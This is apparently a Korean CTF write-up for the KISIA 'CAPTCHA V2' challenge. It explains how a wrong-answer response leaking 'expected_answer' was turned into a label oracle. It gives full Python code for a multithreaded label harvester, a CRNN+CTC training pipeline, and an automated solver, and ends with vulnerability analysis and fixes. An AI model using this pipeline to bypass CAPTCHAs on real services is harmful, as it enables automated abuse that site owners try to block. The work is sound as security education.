---
id: "kisia-ctf-final-captcha-v2"
title: "[KISIA-CTF final] captcha-v2: CAPTCHA를 자기 자신의 라벨 오라클로 만들기"
description: "오답 응답에 담긴 expected_answer 필드 하나가 CAPTCHA의 라벨링 비용을 0으로 만든다. 라벨 수확부터 CRNN+CTC 학습, 90초 60라운드 무실패 클리어까지의 기록."
date: "2026-08-19 10:00"
category: "web-security"
tags: ["KISIA CTF", "CAPTCHA", "CWE-209", "CRNN", "CTC", "머신러닝", "Writeup"]
published: true
---

# [KISIA-CTF final] captcha-v2: CAPTCHA를 자기 자신의 라벨 오라클로 만들기

KISIA CTF 본선 MISC 카테고리의 CAPTCHA와 그 후속 문제인 CAPTCHA V2를 푼 기록이다. 두 문제 모두 793점이었고, 최종적으로 획득한 플래그는 CAPTCHA V2의 것이다.

핵심은 한 문장으로 요약된다. 오답을 제출하면 서버가 응답에 정답을 그대로 담아 돌려준다. 이 한 줄의 정보 노출이 CAPTCHA의 유일한 보안 전제 — 정답은 이미지를 사람이 봐야만 알 수 있다 — 를 무너뜨리고, CAPTCHA를 자기 자신을 학습시킬 라벨링 오라클로 전락시킨다.

풀이 환경은 macOS(Apple Silicon), Python 3.9, PyTorch 2.8(MPS 백엔드), Pillow였다. 챌린지 인스턴스는 60분마다 만료되고 재기동할 때마다 IP와 포트가 바뀌므로, 아래 명령에 등장하는 `http://3.35.97.192:36806`은 실행 시점의 인스턴스 주소로 바꿔야 한다.

---

## 1. 문제

첫 번째 문제인 CAPTCHA의 설명은 이렇게 시작한다. "어느 서비스는 자동화된 접근을 막기 위해 CAPTCHA를 적용하고 있습니다. 관리자는 CAPTCHA가 존재하는 것만으로도 자동화된 요청을 충분히 차단할 수 있다고 판단하고 있지만, 실제 구현이 의도한 만큼 안전한지는 확인되지 않았습니다."

배포 파일은 `captcha-handout.zip` 하나였는데, 열어 보니 RobotoMono 글꼴 4종과 OFL 라이선스 파일뿐이었다. 서버 소스는 제공되지 않는다. 즉 이 문제는 소스를 읽는 화이트박스가 아니라 API 동작만으로 판단해야 하는 블랙박스다. 대신 글꼴을 준다는 사실 자체가 강한 힌트다. 서버가 CAPTCHA를 이 글꼴로 렌더링한다는 뜻이고, 자동 판독을 염두에 두라는 신호로 읽힌다.

클리어 조건은 120초 안에 60문제를 연속으로 맞히는 것이다. 한 번이라도 틀리면 streak가 0으로 초기화된다.

V1에 대해서는 사실을 그대로 적어 둔다. 취약점 발견부터 데이터 수확, 모델 학습(검증 정확도 100%)까지 마쳤으나 솔버를 실행하기 직전에 챌린지 인스턴스가 만료되어(connection refused) V1 플래그는 획득하지 못했다. 이후 문제가 V2로 교체되었고, V1에서 만든 모델 가중치는 V2 공격의 warm-start로 그대로 재사용되어 V2 클리어에 직접 기여했다.

두 번째 문제인 CAPTCHA V2의 설명은 이렇다. "이전 문제 이후 관리자는 CAPTCHA 검증 로직을 보완했습니다. 단순한 방식으로는 더 이상 검증을 통과하기 어렵도록 일부 로직이 변경되었지만, 시스템이 완전히 안전해졌다고 장담할 수는 없습니다."

배포 파일에는 글꼴이 Anonymous Pro, Courier Prime, Cousine, Space Mono 네 종류로 늘어났고 `README.md`가 추가되었다. README는 실행 중인 챌린지의 `/docs`에서 공개 HTTP API를 확인할 수 있다고 안내한다. 제한 시간은 90초로 줄었고, 여전히 60라운드 연속 통과가 목표다. 달라진 점은 한 라운드가 이제 문제 하나가 아니라 패널 세 개짜리 모자이크라는 것이다. 마커가 지정한 순서대로 세 문자열을 `first-second-third` 형식으로 제출해야 한다.

그리고 문제 페이지에 이런 조건이 적혀 있었다. "세 문자열 중 하나 이상이 정확해야 라운드가 인정됩니다." 난이도를 높이려는 장치들 사이에 끼어 있어 눈에 잘 띄지 않지만, 이 완화 규칙이 나중에 결정적으로 작용한다.

---

## 2. 접근 경로 좁히기

도구를 잡기 전에 클리어 조건에서 거꾸로 내려가는 역추적 트리를 먼저 그렸다. 끝나는 상태는 명확하다. streak가 60에 도달한 채로 `/flag`를 호출하는 것이다. 그러려면 60라운드를 연속으로 통과해야 하고, 라운드당 실패 확률이 충분히 낮아야 한다. 여기서 라운드를 통과하는 방법이 갈린다.

사람이 직접 푸는 경로는 즉시 기각된다. 90초에 60문제는 물리적으로 불가능하다. 남은 것은 검증 로직 자체를 우회하는 경로와 이미지를 자동으로 판독하는 경로 두 가지다.

우회 경로는 반증 비용이 훨씬 싸다. HTTP 요청 몇 개면 참인지 거짓인지 판별된다. 그래서 이쪽을 먼저 쳤다.

첫 번째 가설은 라운드 nonce 재사용이었다. `/captcha` 응답 헤더의 `X-Round-Nonce`가 라운드마다 고정된 값이라면, 일부러 오답을 내서 정답을 알아낸 뒤 같은 nonce로 정답을 다시 제출할 수 있을지 모른다. 실제로 해 보니 `{"detail":"no CAPTCHA is awaiting an answer"}`가 돌아왔다. 제출하는 순간 라운드가 소진된다.

두 번째 가설은 라운드 복제였다. `/captcha`를 연속으로 여러 번 호출하면 라운드가 늘어나는지 확인했는데, 세 번 호출해도 동일한 nonce가 반환되었다. 라운드당 nonce는 하나로 고정이다.

세 번째로 오답이 streak를 유지하는지 확인했다. 오답 직후 `streak: 0`이 명확히 찍혔다. 초기화가 맞다.

세 가설이 모두 죽으면서 라운드 자체를 건너뛰는 경로는 없다는 결론이 났다. 그런데 이 프로브 과정에서 정작 중요한 것이 드러났다.

### 오답 응답이 정답을 알려준다

첫 번째 가설을 검증하려고 아무 문자열이나 던졌을 때 돌아온 응답이다.

```json
POST /submit  {"answer":"zzzz", ...}
200 OK
{"correct": false, "streak": 0, "target": 60, "qualified": false,
 "solved": false, "expected_answer": "7wje"}
```

`expected_answer` 필드에 정답이 그대로 들어 있다. 오답을 내면 서버가 답을 알려주는 것이다.

이것만으로 라운드를 통과할 수는 없다. 답을 알게 된 시점에 그 라운드는 이미 소진되었기 때문이다. 첫 가설이 죽은 이유가 바로 그것이다. 그러나 관점을 바꾸면 이야기가 달라진다. 버려도 되는 세션에서 오답을 계속 던지면, `(CAPTCHA 이미지, 정답 문자열)` 쌍을 원하는 만큼 자동으로 모을 수 있다.

CAPTCHA를 기계학습으로 뚫을 때 실질적인 비용은 모델을 만드는 쪽이 아니라 학습 데이터에 사람이 일일이 정답을 달아 주는 라벨링 쪽이다. 이 응답 한 줄이 그 비용을 정확히 0으로 만든다. 정답률이 보장된 데이터를, 사람 손을 전혀 거치지 않고, 서버가 견디는 만큼 무제한으로 생산할 수 있다.

여기서부터 공격 체인이 확정되었다. 버리는 세션으로 라벨 데이터를 수확하고, 이미지의 구조를 측정으로 확정하고, 그 데이터로 문자 인식 모델을 학습시킨 뒤, 90초 세션에서 60라운드를 자동으로 응답한다.

---

## 3. 사용한 도구

초기 정찰은 `curl`로 했다. 응답 헤더와 CSP를 확인하고, V2에서는 README가 안내한 `/openapi.json`을 받아 API 스펙을 교차 검증했다.

수확기와 솔버는 Python 표준 라이브러리의 `urllib`과 `threading`만으로 작성했다. 외부 HTTP 라이브러리를 쓰지 않은 것은 재현 환경의 의존성을 줄이기 위해서다.

이미지 처리는 Pillow와 NumPy를 썼다. 패널 경계 검출, 마커 도트 카운팅, 평균 합성이 전부 이 둘로 해결된다.

모델은 PyTorch 2.8을 MPS 백엔드로 돌렸다. 여기에 함정이 하나 있다. macOS의 MPS 백엔드는 `aten::_ctc_loss` 연산을 아직 구현하지 않았다. 그대로 실행하면 `NotImplementedError`가 난다. `PYTORCH_ENABLE_MPS_FALLBACK=1` 환경변수를 주어 해당 연산만 CPU로 폴백시켜야 학습이 돌아간다.

---

## 4. 정찰

### API 열거

`/static/app.js`를 읽어 전체 흐름을 복원했다. V2에서는 `/openapi.json`으로 다시 확인했는데, 엔드포인트 구성은 V1과 동일했다.

`POST /start`는 토큰과 함께 `server_time`, `expires_at`, `deadline_in`, `streak`, `target`을 반환한다. `GET /captcha`는 PNG 본문을 주면서 응답 헤더 `X-Round-Nonce`에 라운드 식별자를 담는다. `POST /submit`은 토큰, 답, round_nonce를 받아 `correct`, `streak`, `solved`를 반환하고, 틀렸을 때는 여기에 `expected_answer`가 붙는다. streak가 target에 도달하면 `GET /flag`가 플래그를 준다. 인증은 전부 `Authorization: Bearer <token>` 헤더로 이루어진다.

제한 시간은 V1이 120초, V2가 90초이고 목표는 둘 다 60이다. 문자셋은 양쪽 모두 `23456789abcdefghjkmnpqrstuvwxyz`로, 혼동하기 쉬운 `0`, `1`, `i`, `l`, `o`를 제외한 31자다. 문자열 길이는 4자에서 7자 사이에서 변한다.

### V1 이미지 판독 시도

V1의 CAPTCHA는 240×80 크기의 PNG였다. 여러 색으로 칠해진 회전된 글자 위로 곡선 노이즈가 지나간다.

![V1 CAPTCHA 샘플 6장](/images/kisia-captcha-v2/v1_samples.png)

정답은 위에서부터 `nqj7ka`, `brh3rj`, `d4zbz6`, `7b3uc5`, `9627v`, `3dwgn`이다.

처음 눈으로 봤을 때는 글자가 어두운 보라색이고 노이즈 선이 초록색으로 보였다. 그렇다면 색으로 분리해서 이진화한 뒤 Tesseract에 넣으면 되겠다고 판단하고 마스크를 만들었다. 결과는 실패였다.

![색 기반 마스크 적용 결과](/images/kisia-captcha-v2/v1_colorsplit_fail.png)

여섯 글자 중 두 개만 남고 나머지는 통째로 사라졌다.

원인을 확인하려고 눈짐작 대신 픽셀 히스토그램을 직접 뽑아 보니, 글리프마다 색이 다르고 노이즈 선이 글자와 같은 색 팔레트를 공유하고 있었다. 색으로는 애초에 분리가 되지 않는 이미지였다. 눈으로 본 인상을 검증 없이 전제로 삼은 것이 문제였다.

규칙 기반 전처리를 버리고 학습 기반으로 전환했다. 라벨을 무한히 얻을 수 있는 상황이라 이쪽이 오히려 비용이 낮다.

### V2 이미지의 구조

V2의 이미지는 808×116 크기의 모자이크다. 패널이 세 개 있고, 각 패널의 좌측 상단에 작은 점 마커가 찍혀 있다.

![V2 모자이크 샘플](/images/kisia-captcha-v2/v2_mosaic.png)

이 샘플의 `expected_answer`는 `epqgx-fdn58-j2yx6p`였다. 화면상 패널 내용은 왼쪽부터 `j2yx6p`(점 3개), `fdn58`(점 2개), `epqgx`(점 1개)였다. 정답 문자열과 대조하면 규칙이 바로 나온다. 점 개수가 곧 정답에서의 순번이다. 점 하나면 첫 번째, 둘이면 두 번째, 셋이면 세 번째다.

---

## 5. 구조를 추측하지 않고 측정하기

패널 좌표를 한 장의 이미지에서 잡으려고 하면 검출이 흔들린다. 실제로 밝은 영역을 기준으로 경계를 찾아 봤더니 이미지마다 다른 좌표가 나왔다. 패널 안의 내용물이 검출을 방해하기 때문이다.

해결책은 단순하다. 여러 장을 평균 내면 매번 달라지는 내용물은 흐려지고 항상 같은 자리에 있는 구조만 남는다. 60장을 평균 합성했다.

![60장 평균 합성 이미지](/images/kisia-captcha-v2/v2_layout_mean.png)

패널 테두리가 선명하게 드러난다. 평균 이미지의 열 프로파일에서 어두운 세로선을 추출하니 패널 테두리가 x = 17, 258 / 283, 524 / 549, 790에, 가로 테두리가 y = 17, 98에 있었다. 내부를 크롭하면 각 패널은 정확히 240×80이 된다.

여기서 중요한 관찰이 하나 나온다. V2의 패널 하나가 V1 이미지와 픽셀 규격이 완전히 같다. 출제자가 V1의 렌더링 코드를 그대로 재사용해 세 개를 나란히 붙인 것이다. 덕분에 V1에서 학습시킨 모델 가중치를 V2에 그대로 초기값으로 넣을 수 있게 되었고, 이것이 나중에 학습 시간을 크게 줄여 주었다.

### 마커 규칙 검증

점 마커는 패널 상단 여백(y 0~16)에 5픽셀 크기로 최대 세 개까지 찍힌다. 클러스터 개수를 세면 순번이 나온다.

"점 개수는 항상 1, 2, 3의 순열일 것"이라는 전제를 세우고 400장을 전수 검증했다. 결과는 오분류 0건이었고, 여섯 가지 순열이 76, 70, 68, 66, 64, 56회로 고르게 나타났다. 마커 디코딩은 확률적 추론이 아니라 결정적 규칙이며 100% 신뢰할 수 있다는 뜻이다.

```
sizes      : Counter({(808, 116): 400})
bad perms  : 0 of 400
perm dist  : (1,2,3):76  (2,3,1):70  (3,2,1):68  (3,1,2):66  (2,1,3):64  (1,3,2):56
```

크롭한 패널과 `expected_answer`를 순번으로 매칭한 결과가 실제로 맞는지도 눈으로 확인했다.

![크롭된 패널과 매핑된 라벨](/images/kisia-captcha-v2/v2_panels.png)

위에서부터 `4ss43gd`, `3kbqh`, `p9wx`, `jxszg`로, 이미지 내용과 정확히 일치한다.

---

## 6. 익스플로잇 1: 라벨 오라클 수확기

버리는 세션에서 `GET /captcha`와 `POST /submit`(오답)을 반복해 이미지와 정답 쌍을 모은다. 오답 제출은 streak만 0으로 만들 뿐 세션 자체는 살아 있으므로, 토큰 하나로 계속 수확할 수 있다.

```python
import urllib.request, json, os, threading, sys, itertools
B=sys.argv[3] if len(sys.argv)>3 else "http://3.35.97.192:36806"

def post(path,data=None,tok=None):
    h={}
    if tok:h["Authorization"]="Bearer "+tok
    body=None
    if data is not None:
        body=json.dumps(data).encode();h["Content-Type"]="application/json"
    req=urllib.request.Request(B+path,data=body,headers=h,method="POST")
    try:
        r=urllib.request.urlopen(req,timeout=25);return json.load(r)
    except Exception as e: return {"err":str(e)}

def getcap(tok):
    req=urllib.request.Request(B+"/captcha",headers={"Authorization":"Bearer "+tok})
    r=urllib.request.urlopen(req,timeout=25)
    return r.headers.get("X-Round-Nonce"), r.read()

os.makedirs("v2data",exist_ok=True)
lock=threading.Lock(); lf=open("v2data/labels.txt","a",buffering=1)
gid=itertools.count(int(sys.argv[2])); done=[0]; TARGET=int(sys.argv[1])

def worker():
    tok=None
    while True:
        with lock:
            if done[0]>=TARGET: return
        try:
            if tok is None:
                tok=post("/start").get("token")
                if not tok: continue
            n,img=getcap(tok)
            # 의도적 오답 → 서버가 expected_answer 로 정답을 알려준다
            w=post("/submit",{"token":tok,"answer":"!","round_nonce":n},tok)
            ans=w.get("expected_answer")
            if not ans: tok=None; continue
            with lock: idx=next(gid); done[0]+=1
            open(f"v2data/{idx:05d}.png","wb").write(img)
            with lock: lf.write(f"{idx:05d}.png {ans}\n")
        except Exception: tok=None

ths=[threading.Thread(target=worker) for _ in range(6)]
for t in ths:t.start()
for t in ths:t.join()
print("done",done[0])
```

실행은 이렇게 한다.

```bash
python3 harvest2.py 5000 10000 http://3.35.97.192:36806
```

이 스크립트가 지금 형태로 정착하기까지 세 번 실패했고, 재현하려는 사람이 같은 함정을 밟지 않도록 적어 둔다.

첫째, 라벨 파일은 반드시 라인 버퍼(`buffering=1`)로 열어야 한다. 처음에는 기본 버퍼로 열었는데, 프로세스가 타임아웃으로 강제 종료되면서 버퍼가 flush되지 않아 이미지 75장이 라벨 없이 남았다. 이미지만 있고 정답이 없으면 학습에 쓸 수 없으므로 통째로 버려야 했다.

둘째, 파일 인덱스를 실패 시 반납하면 안 된다. 초기 구현은 요청이 실패한 워커가 인덱스를 되돌려 놓게 만들었는데, 그 사이 다른 워커가 같은 번호를 집어 파일을 덮어썼다. 1500장을 요청했는데 실제로는 211장만 남는 사고가 났다. `itertools.count()`로 단조 증가시켜 해결했다.

셋째, 동시 스레드 수는 6이 적당하다. 12로 올리자 서버가 포화되어 요청이 오히려 타임아웃되기 시작했다. 6스레드에서 측정한 수확 속도는 분당 약 166 모자이크, 패널로 환산하면 분당 약 500장이다.

---

## 7. 익스플로잇 2: 데이터셋 구성과 모델 학습

### 모자이크를 패널 단위로 쪼개기

앞에서 측정한 좌표로 패널을 잘라 내고, 마커에서 읽은 순번으로 `expected_answer`를 나눠 각 패널에 정답을 붙인다. 모자이크 한 장이 패널 세 장이 되므로 학습 데이터가 3배로 증폭된다.

```python
from PIL import Image
import numpy as np, os

P=[(18,258),(284,524),(550,790)]          # 5장에서 측정한 패널 x 경계

def dots(a,x0):                            # 마커 점 클러스터 개수 = 순번
    strip=a[0:17,x0-1:x0+45]; cols=(strip<170).sum(axis=0)
    n=0; prev=False
    for v in cols>0:
        if v and not prev: n+=1
        prev=v
    return n

os.makedirs("v2panels",exist_ok=True)
out=open("v2panels/labels.txt","w",buffering=1); n=0; skip=0
for line in open("v2data/labels.txt"):
    fn,ans=line.split()
    parts=ans.split("-")
    if len(parts)!=3: skip+=1; continue
    im=Image.open(os.path.join("v2data",fn)).convert("RGB")
    if im.size!=(808,116): skip+=1; continue
    a=np.asarray(im).astype(int).min(axis=2)
    ds=[dots(a,x0) for x0,_ in P]
    if sorted(ds)!=[1,2,3]: skip+=1; continue        # 마커 무결성 게이트
    for (x0,x1),d in zip(P,ds):
        im.crop((x0,18,x1,98)).save(f"v2panels/{fn[:-4]}_{d}.png")
        out.write(f"{fn[:-4]}_{d}.png {parts[d-1]}\n"); n+=1
out.close(); print("panels",n,"skipped",skip)
```

### CRNN + CTC

문자열 길이가 4자에서 7자까지 변하므로 고정 길이 분류로는 풀 수 없다. 가변 길이 시퀀스를 다루는 표준적인 방법인 CTC(Connectionist Temporal Classification)를 썼다.

구조는 이렇다. 240×80 RGB 이미지를 CNN에 통과시켜 높이를 1로 접고 폭 60짜리 시퀀스로 만든다. 이것을 양방향 LSTM에 넣어 각 시점의 문자 분포를 얻고, greedy CTC 디코딩으로 문자열을 복원한다. 클래스는 blank를 포함해 37개다.

```python
DEV = torch.device("mps" if torch.backends.mps.is_available() else "cpu")
CHARS = "0123456789abcdefghijklmnopqrstuvwxyz"     # blank=0, 총 37 클래스
W,H = 240,80

def blk(i,o): return nn.Sequential(nn.Conv2d(i,o,3,1,1), nn.BatchNorm2d(o), nn.ReLU())

class CRNN(nn.Module):
    def __init__(s):
        super().__init__()
        s.cnn=nn.Sequential(
            blk(3,64),    nn.MaxPool2d(2),        # 40 x 120
            blk(64,128),  nn.MaxPool2d(2),        # 20 x 60
            blk(128,256), blk(256,256), nn.MaxPool2d((2,1)),   # 10 x 60
            blk(256,512), nn.MaxPool2d((2,1)),                 #  5 x 60
            blk(512,512), nn.MaxPool2d((5,1)),                 #  1 x 60
        )
        s.rnn=nn.LSTM(512,256,num_layers=2,bidirectional=True,batch_first=True,dropout=0.2)
        s.fc=nn.Linear(512,NCLS)
    def forward(s,x):
        f=s.cnn(x).squeeze(2).permute(0,2,1)      # B,60,512
        r,_=s.rnn(f)
        return s.fc(r)                             # B,60,37

def decode(logits):                                # greedy CTC
    ids=logits.argmax(-1).cpu().numpy(); outs=[]
    for seq in ids:
        prev=0; s=""
        for t in seq:
            if t!=0 and t!=prev: s+=i2c[t]
            prev=t
        outs.append(s)
    return outs

model=CRNN().to(DEV)
# V1에서 학습한 가중치로 warm-start (패널 규격이 240x80으로 동일)
model.load_state_dict(torch.load("model.pt",map_location=DEV))
opt=torch.optim.Adam(model.parameters(),lr=3e-4)
ctc=nn.CTCLoss(blank=0,zero_infinity=True)
...
loss.backward(); torch.nn.utils.clip_grad_norm_(model.parameters(),5.0); opt.step()
```

```bash
PYTORCH_ENABLE_MPS_FALLBACK=1 python3 train_v2.py 60
```

학습에서도 세 번 막혔다.

처음에는 loss가 3.79 근처에서 멈추고 예측이 전부 빈 문자열로 나왔다. CTC에서 흔한 blank collapse다. 학습률 1e-3이 소량 데이터에 비해 과했던 것으로, 3e-4로 낮추고 gradient clipping(norm 5.0)을 넣자 풀렸다.

다음은 앞서 언급한 MPS의 `aten::_ctc_loss` 미구현 문제였고, 환경변수 폴백으로 해결했다.

마지막 함정이 가장 위험했다. 초반 8에폭까지 정확도가 계속 0%로 찍힌다. 학습이 실패한 것으로 오판하고 중단하기 딱 좋은 구간인데, 실제로는 CTC가 입력과 출력의 정렬을 배우는 동안 나타나는 정상적인 정체다. 실제로 한 번 여기서 잘못 중단했다가, 끊지 않고 40에폭까지 관측하자 94%로 뛰어올랐다.

### 학습 결과

V1은 RobotoMono 한 종류만 쓰므로 쉬웠다. 1,483 샘플로 학습해 검증 200 샘플에서 16에폭 만에 exact-match 100%에 도달했다.

V2는 글꼴이 네 종류라 더 어렵지만, V1 가중치로 warm-start한 효과가 컸다. 무작위 초기화에서는 8에폭까지 0%였던 것이 warm-start에서는 0에폭에 이미 66.3%로 시작했다. 1,443 패널로 학습해 검증 300 패널에서 24에폭에 91.7%를 기록했다.

수치 하나는 정확히 밝혀 둔다. 수확기는 최종적으로 모자이크 1,192장, 패널로는 3,576장을 모았지만, 실제로 클리어에 사용한 모델은 수확 도중 스냅샷인 모자이크 581장(패널 1,743장)으로 학습한 것이다. 즉 91.7%는 전체 데이터의 절반도 쓰지 않고 얻은 수치이고, 전량을 쓰면 더 올라간다. V1이 1,683 샘플 시점에 이미 100%에 도달한 것을 보면 그렇다.

### 91.7%면 충분한 이유

여기서 앞에 언급했던 완화 규칙이 결정적으로 작용한다. 라운드 판정이 "세 문자열 중 하나 이상 정답"이므로, 패널 하나의 정확도를 p라 할 때 라운드 성공률은 세 번 모두 틀릴 확률의 여집합이 된다.

```
라운드 성공률       = 1 - (1-p)^3 = 1 - (1-0.917)^3 = 0.99943
60라운드 연속 성공률 = 0.99943^60 ≈ 0.966
```

패널 정확도 91.7%만으로 세션 한 번에 약 97% 확률로 클리어된다는 뜻이다. 방어측이 난도를 올리려고 넣은 "패널 세 개" 구조가, "하나만 맞으면 통과" 규칙과 결합하면서 오히려 공격자에게 오류 내성을 3중으로 제공한 셈이 되었다.

---

## 8. 익스플로잇 3: 실전 솔버

솔버는 받은 모자이크에서 세 패널을 잘라 마커로 순번을 읽고, 세 장을 한 번의 배치로 추론한 뒤 순번대로 재배치해 제출한다. 배치 추론으로 묶은 것은 라운드당 지연을 줄이기 위해서다. 90초 안에 60라운드를 채우려면 라운드당 왕복이 1.5초를 넘으면 안 된다.

```python
P=[(18,258),(284,524),(550,790)]

def predict(png):
    im=Image.open(io.BytesIO(png)).convert("RGB")
    g=np.asarray(im).astype(int).min(axis=2)
    crops=[]; ds=[]
    for x0,x1 in P:
        ds.append(dots(g,x0))                                  # 마커 → 순번
        a=np.asarray(im.crop((x0,18,x1,98)),dtype=np.float32)/255.0
        crops.append(np.transpose(a,(2,0,1)))
    x=torch.from_numpy(np.stack(crops)).to(DEV)
    with mlock, torch.no_grad(): preds=decode(model(x))         # 3패널 배치 추론
    slots=[""]*3
    for d,p in zip(ds,preds):
        if 1<=d<=3: slots[d-1]=p                               # 마커 순서로 재배치
    return "-".join(slots)

def session(wid):
    while FLAG[0] is None:
        d=req("/start"); tok=d["token"]; t0=time.time()
        while time.time()-t0<88 and FLAG[0] is None:
            r,img=req("/captcha",tok=tok,raw=True)
            n=r.headers.get("X-Round-Nonce")
            res=req("/submit",{"token":tok,"answer":predict(img),"round_nonce":n},tok)
            if res.get("solved"):
                FLAG[0]=req("/flag",tok=tok)["flag"]; return
```

세션은 서버 마감 90초보다 짧은 88초에서 스스로 종료하고 다시 시작한다. 안전 마진이다. 스레드 두 개로 세션을 병렬로 굴려 한쪽이 실패해도 즉시 재시도되게 했다.

실행할 때 반드시 지켜야 할 것이 하나 있다. 수확기를 먼저 죽여야 한다. 수확기가 서버 CPU를 점유하고 있으면 라운드 처리량이 떨어져 90초 안에 60라운드를 채우지 못한다. 실제로 수확기를 켠 채 응답 지연을 측정하려다 요청이 타임아웃되는 것을 확인했다.

---

## 9. 실행과 결과

전체 재현 절차는 네 단계다.

```bash
# 1) 라벨 오라클 수확 (분당 약 166 모자이크. 4분이면 581장 = 패널 1,743장으로 충분)
python3 harvest2.py 5000 10000 http://3.35.97.192:36806

# 2) 패널 단위 데이터셋 구성
python3 build2.py

# 3) 학습 (V1 가중치 warm-start, MPS)
PYTORCH_ENABLE_MPS_FALLBACK=1 python3 train_v2.py 60

# 4) 실전 주행 — 수확기는 반드시 종료 후 실행
pkill -f harvest2.py
PYTORCH_ENABLE_MPS_FALLBACK=1 python3 solve_v2.py http://3.35.97.192:36806 2
```

첫 시도에서 60라운드를 전부 통과했다. 로그에 MISS는 한 건도 기록되지 않았다.

![streak가 1부터 60까지 올라가고 플래그가 출력된 실행 로그](/images/kisia-captcha-v2/success.png)

```
kisia{DdQJoCqj3d45Iqb8zFNSecMt8X3Jlpfe400b2a0e}
```

---

## 10. 취약점 분석

이 문제의 근본 원인은 CWE-209, 민감한 정보를 담은 오류 메시지 생성이다. `POST /submit`이 오답일 때 응답 본문에 `expected_answer`를 포함시킨다.

의도 자체는 짐작이 간다. "정답은 XXX였습니다"라고 알려 주는 편이 사용자 경험에 좋다. 실제로 프런트엔드 코드에도 그 문구를 띄우는 로직이 들어 있다. 문제는 이 친절이 CAPTCHA의 유일한 보안 전제를 정면으로 깬다는 것이다. CAPTCHA는 "정답은 이미지를 사람이 봐야만 알 수 있다"는 가정 위에 서 있는데, 서버가 그 정답을 요청만 하면 내주고 있었다.

앞서 말했듯 CAPTCHA에 대한 기계학습 공격의 실질적 비용은 모델이 아니라 라벨링이다. 이 필드 하나가 그 비용을 0으로 만들었다.

### V2 방어 강화가 전부 실패한 이유

V2는 다섯 가지를 강화했지만 하나도 유효하지 않았다.

글꼴을 네 종류로 늘린 것은 데이터가 무한한 상황에서는 의미가 없다. 모델이 네 종류를 모두 학습하면 그만이다.

패널을 세 개로 나눈 것은 오히려 역효과였다. 학습 데이터가 라운드당 3배로 증폭되었다.

마커 기반 순서 셔플은 마커가 이미지 안의 결정적 규칙이라는 점에서 무력했다. 400장 전수 검사에서 오분류가 0건이었다. 사람이 보고 이해할 수 있게 만든 규칙은 기계도 100% 읽는다.

제한 시간을 120초에서 90초로 줄인 것은 라운드당 추론이 수십 밀리초인 상황에서 아무 제약이 되지 않았다.

그리고 "세 문자열 중 하나 이상 정답이면 통과"라는 규칙은, 난이도를 낮춰 주려는 배려였겠지만 결과적으로 요구 정확도를 91.7%까지 끌어내려 공격을 훨씬 쉽게 만들었다.

정리하면, V2의 방어 강화는 전부 "이미지를 읽기 어렵게 만드는" 축에 집중되어 있었다. 그런데 실제 취약점은 "정답이 유출되는" 축에 있었다. 축이 어긋난 방어는 아무리 정교해도 효과가 없다.

### 권고

가장 중요한 조치는 `expected_answer` 필드를 제거하는 것이다. 오답 응답은 `{"correct": false}`로 충분하다. 이 하나만으로 지금까지 서술한 공격 전체가 성립하지 않는다.

그 다음으로 세션과 IP 단위의 라운드 발급 총량 제한이 필요하다. 정상적인 사용자는 120초에 60라운드를 넘길 이유가 없는데, 이 공격은 세션 수천 개를 소모한다. 같은 맥락에서 오답률이 비정상적으로 높은 클라이언트, 즉 라벨을 수확하는 패턴을 탐지해 차단할 수 있다.

순서 마커를 이미지 내부의 결정적 픽셀 패턴으로 넣는 설계도 재고할 만하다. 결정적 규칙은 언제나 100% 자동 디코딩된다.

근본적으로는, 자체 구현한 이미지 CAPTCHA가 기계학습 자동화에 취약하다는 점을 받아들이는 편이 낫다. 검증된 서드파티 CAPTCHA를 쓰거나 행위 기반 판별로 대체하는 것을 권한다.

---

## 11. 스크립트 구성

풀이에 사용한 스크립트는 역할별로 다음과 같이 나뉜다.

| 파일 | 역할 |
| --- | --- |
| `harvest2.py` | V2용 라벨 오라클 수확기 |
| `harvest_v1.py` | V1용 수확기 |
| `build2.py` | 모자이크 → 패널 데이터셋 변환 (마커 디코딩 포함) |
| `train_v2.py` | CRNN+CTC 학습 (V1 가중치 warm-start 적용) |
| `train_v1.py` | V1용 학습 스크립트 |
| `solve_v2.py` | 최종 익스플로잇 |

---

## 12. 요약

`/submit`의 오답 응답에 포함된 `expected_answer` 필드가 CAPTCHA를 자기 자신의 라벨링 오라클로 만들었다. 이를 이용해 수 분 만에 라벨링된 학습 데이터 1,743장을 자동으로 수집하고, CRNN+CTC 모델을 학습시켜 90초 안에 60라운드를 무실패로 통과했다.

V2에서 추가된 다중 폰트, 패널 분할, 순서 셔플 방어는 라벨이 무한하다는 전제 앞에서 모두 무력했다. 특히 "세 문자열 중 하나 이상 정답이면 통과"라는 완화 규칙은 요구 정확도를 크게 낮춰, 91.7%의 패널 인식률만으로 클리어가 가능하게 만들었다.
